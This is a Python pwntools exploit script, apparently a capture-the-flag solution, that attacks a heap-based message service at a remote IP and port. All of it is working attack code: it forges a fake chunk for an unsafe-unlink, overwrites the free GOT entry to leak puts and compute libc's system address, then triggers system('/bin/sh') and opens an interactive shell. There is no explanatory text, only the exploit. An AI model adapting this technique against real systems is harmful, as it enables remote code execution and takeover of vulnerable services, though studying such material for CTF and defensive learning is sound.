from pwn import *

#p = process('./fb')
p = remote('114.55.103.213', 9733)

def menu():
	p.recvuntil('Choice:')

def create(size):
	p.sendline('1')
	p.recvuntil('Input the message length:')
	p.sendline(str(size))

def set(index, buf):
	p.sendline('2')
	p.recvuntil('Input the message index:')
	p.sendline(str(index))
	p.recvuntil('Input the message content:')
	p.send(buf)

def delete(index):
	p.sendline('3')
	p.recvuntil('Input the message index:')
	p.sendline(str(index))

menu()
create(256) # 0

menu()
create(256 - 0x8) # 1

menu()
create(256 - 0x8) # 2

menu()
create(256) # 3

set(3, '/bin/sh\x00\n')

block_addr = 0x6020d0

fake = 'X' * 0x10
fake += p64(block_addr - 0x18) + p64(block_addr - 0x10)
fake += p64(0) + p64(0)
fake = fake.ljust(256 - 0x10, 'X')
fake += p64(256 - 0x10)
set(1, fake + '\n')

delete(2)

puts_plt = 0x4006c0
free_got = 0x602018
puts_got = 0x602020

payload = 'A' * 0x8
payload += p64(free_got)
set(1, payload[:-1] + '\n')

set(0, p64(puts_plt)[:-1] + '\n')

payload = 'A' * 0x8
payload += p64(puts_got)
set(1, payload[:-1] + '\n')

delete(0)
leak = p.recvuntil('\n', drop=True)
leak = leak.ljust(8, '\x00')
puts_addr = u64(leak)
print 'puts_addr: %s' % hex(puts_addr)
libc_base = puts_addr - 0x6fd60
system = libc_base + 0x46590

payload = 'A' * 0x8
payload += p64(free_got)
payload += p64(0x100)
set(1, payload[:-1] + '\n')

set(0, p64(system)[:-1] + '\n')

delete(3)

p.interactive()

	
